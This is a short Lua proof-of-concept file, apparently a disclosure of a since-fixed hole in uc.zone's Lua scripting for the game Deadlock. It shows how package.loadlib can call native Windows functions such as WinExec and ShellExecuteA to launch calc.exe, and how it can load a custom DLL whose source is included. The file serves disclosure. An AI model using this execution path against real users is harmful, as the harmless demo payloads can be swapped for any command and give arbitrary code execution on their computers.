-- README:
-- A vulnerability that allows execution of any code on the user's computer using Lua script for uc.zone(Deadlock).
-- Video of PoC: https://youtu.be/vug43VwxWYc
-- Current status: fixed

--[[
  Small PoC of exporting metods from kenel32.dll
]]
local beep = package.loadlib(
    [[C:\Windows\System32\kernel32.dll]],
    "Beep"
)

beep(750, 300)
--[[
  Shellrun PoC
]]
--[[
UINT WinExec(
  [in] LPCSTR lpCmdLine,
  [in] UINT   uCmdShow
);
]]
local winexec = package.loadlib(
    [[C:\Windows\System32\kernel32.dll]],
    "WinExec"
)
winexec("calc.exe", 1)
-- or
local shell = package.loadlib([[C:\Windows\System32\shell32.dll]], "ShellExecuteA")

--[[
HINSTANCE ShellExecuteA(
  [in, optional] HWND   hwnd,
  [in, optional] LPCSTR lpOperation,
  [in]           LPCSTR lpFile,
  [in, optional] LPCSTR lpParameters,
  [in, optional] LPCSTR lpDirectory,
  [in]           INT    nShowCmd
);
]]
shell(nil, "open", "calc.exe", nil, nil, 1)


--[[
  Custom DLL execution PoC
]]
-- Dll:
--[[
#include <windows.h>

#define EXPORT extern "C" __declspec(dllexport)

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved)
{
    return TRUE;
}

EXPORT int hello()
{
    MessageBoxA(
        nullptr,
        "Hello from DLL!",
        "Test DLL",
        MB_OK | MB_ICONINFORMATION
    );

    return 0;
}
]]
local messagebox_hello = package.loadlib(
  [[C:\Uc\test.dll]], 
  "hello"
)
messagebox_hello()
